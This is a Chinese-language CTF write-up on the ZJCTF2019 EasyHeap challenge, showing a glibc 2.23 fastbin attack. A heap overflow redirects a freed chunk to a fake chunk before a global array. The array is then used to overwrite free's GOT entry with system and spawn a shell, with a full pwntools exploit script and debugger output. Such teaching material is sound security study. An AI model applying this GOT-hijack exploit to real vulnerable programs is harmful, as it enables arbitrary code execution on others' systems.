---
title: 从零开始的堆利用 02
published: 2026-10-21T13:00:00.000Z
description: 又一次glibc-2.23 fastbin attack
tags:
  - pwn
  - glibc
category: Heap
draft: true
lang: zh_CN
---

# 从零开始的堆利用 02

> 从 ZJCTF2019 - EasyHeap 看 glibc2.23 下的 fastbin attack

笔者认为 fastbin attack 中关键的一点是绕过 size 位检测。本文将展示 fastbin attack 这一攻击方式的多样性。

## 逆向分析

首先检测文件保护 

```text
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x3fe000)
Stripped:   No
```

注意到没有开启 PIE 。

逆向程序发现没有查看 chunk 内容的函数，所以无法泄露 libc 。

关键漏洞仍然是 `edit_heap()` 函数没有限制输入大小，可以利用堆溢出来篡改 fastbin 中 chunk 的  fd 指针。综上攻击思路是将 fd 劫持到 got表附近，劫持 GOT 表，修改 `free_got` ，但是因为绕过检测的原因将 fd 指针劫持到了全局数组 `heaparray[]` 前。

调试时选择了 `0x6020ad` 这个地址，发现 got 表段并没有合适的字段可以伪造 size 位，而申请到 `0x6020ad` 后可以很容易的覆写到 `heaparray[]` 。

```
pwndbg> tele 0x6020ad
00:0000│     0x6020ad ◂— 0xd4129c48e0000000
01:0008│     0x6020b5 (stdin@@GLIBC_2.2.5+5) ◂— 0x72 /* 'r' */
02:0010│     0x6020bd ◂— 0xdeedbeef0a0a0a
03:0018│     0x6020c5 (magic+5) ◂— 0xdeedbeef000000
... ↓     2 skipped
06:0030│     0x6020dd ◂— 0x602018000000
07:0038│     0x6020e5 (heaparray+5) ◂— 0x2ec38030000000
```

比如将 `heaparray[0]` 覆写为 `free_got` ，再利用 `edit_heap` 写为 `system_plt` ，之后 free 一次就好了。



## EXP

```python
from pwn import *
context(arch='amd64', log_level='debug', os='linux')

# glibc 2.23 
# no show
# no PIE
# got hajack and fastbin attack

elf=ELF('./pwn',checksec=False)
system_got=elf.got['system']
free_got=elf.got['free']
system_plt=elf.plt['system']
# 
# free_got=0x602038
fake_chunk=0x6020ad

io = process('./pwn')
# io = remote('', )

def menu(choice):
    io.sendlineafter(b'choice :',str(choice).encode())

def add(size,data):
    menu(1)
    io.sendlineafter(b'Heap : ',str(size).encode())
    io.sendafter(b'heap:',data)

def delete(id):
    menu(3)
    io.sendlineafter(b'Index :',str(id).encode())

# def show():
#     menu()

def edit(id,size,data):
    menu(2)
    io.sendlineafter(b'Index :',str(id).encode())
    io.sendlineafter(b'Heap : ',str(size).encode())
    io.sendafter(b'heap : ',data)

sc = '''break *0x400C87
c
'''
add(0x18,b'A'*0x18)     # 0
add(0x60,b'B'*0x60)     # 1
add(0x60,b'C'*0x60)     # 2
add(0x10,b'/bin/sh\x00')     # 3
# gdb.attach(io, sc)

delete(2)
delete(1)

payload1=b'A'*0x18+p64(0x71)+p64(fake_chunk)
edit(0,len(payload1),payload1)

payload2=p8(10)*3+p64(0xdeedbeef)*4+p64(0x602018)
add(0x60,b'B'*0x60)     # 1
add(0x60,payload2)      # 2

edit(0,8,p64(system_plt))

delete(3)

io.interactive()

```

